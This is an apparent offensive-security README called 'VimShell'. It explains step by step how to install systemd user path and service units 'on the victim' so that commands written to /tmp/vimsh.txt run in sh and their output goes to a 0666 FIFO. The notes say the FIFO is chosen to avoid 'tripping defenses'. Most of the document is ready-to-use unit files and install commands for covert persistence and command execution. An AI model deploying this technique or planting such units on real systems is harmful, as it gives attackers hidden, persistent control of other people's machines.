# VimShell

## Description

This sequence of commands sets up an interactive shell via a text file and FIFO pipe.
systemd facilitates this interaction by redirecting the text file, `/tmp/vimsh.txt` (opened in everyone's favorite editor - `vim`)
to the input of the `sh` terminal. Using sytemd's path-based units, we're able to notify the shell
when new commands need to be executed.

The shell service file (`execshell.service`) uses:

* The `ExecStart` directive to execute the terminal shell
* The `ExecStartPre` directive to check fo the FIFO pipe and create it if it does not exist
* The `StandardInput` directive uses the regular file `/tmp/vimsh.txt` as a stream of commands to process
* The `StandardOutput` directive uses the FIFO pipe `/tmp/vimsh.out` as a stream to send command output to

The path file (`vimsh.path`) uses:

* The `PathModified` directive to monitor the input file
* The `Unit` directive to execute the shell service when the input file has been modified

## Additional Notes

* We could have used another regular text file as output instead of a FIFO pipe, but that would write all our command output
  to disk, potentially tripping defenses.
* Each command in `/tmp/vimsh.txt` must be on a separate line, just like in shell scripts (or you can use `;`)
* In order for systemd to see that a file has been updated, you must save changes to disk - merely modifying the buffer in `vim` won't do anything
  * Tip: Use `:wq` outside of "Insert" mode (hit `[Escape]` to exit this mode) to save the buffer to disk
* An excellent writeup of file redirects and executing shell commands through a file (Example 13): <https://catonmat.net/bash-one-liners-explained-part-three>

## Step by Step

1. Generate a service file to execute commands

```ini
$ cat execshell.service
; https://www.freedesktop.org/software/systemd/man/systemd.service.html
[Unit]
Description=Execute shell commands in the given input file

[Service]
Type=simple
StandardInput=file:/tmp/vimsh.txt
StandardOutput=file:/tmp/vimsh.out
ExecStartPre=/bin/sh -c "find /tmp/vimsh.out || mknod --mode=0666 /tmp/vimsh.out p"
ExecStart=/bin/sh
```

3. Generate a path file to execute the shell service

```ini
; https://www.freedesktop.org/software/systemd/man/systemd.path.html
[Path]
PathModified=/tmp/vimsh.txt
Unit=execshell.service
```

4. Install into the systemd user folder on the victim

```sh
mkdir -p ~/.config/systemd/user/
ln -s `pwd`/execshell.service ~/.config/systemd/user/
ln -s `pwd`/vimsh.path ~/.config/systemd/user/
```

5. Start the path unit

```sh
systemctl --user start vimsh.path
```

6. Open up the file `/tmp/vimsh.txt` to add shell commands to, and save it when ready

```sh
$ cat /tmp/vimsh.txt
whoami
pwd
```

7. Display the FIFO pipe `/tmp/vimsh.out` to read output

```sh
$ tail -f /tmp/vimsh.out
user01
/tmp/
```
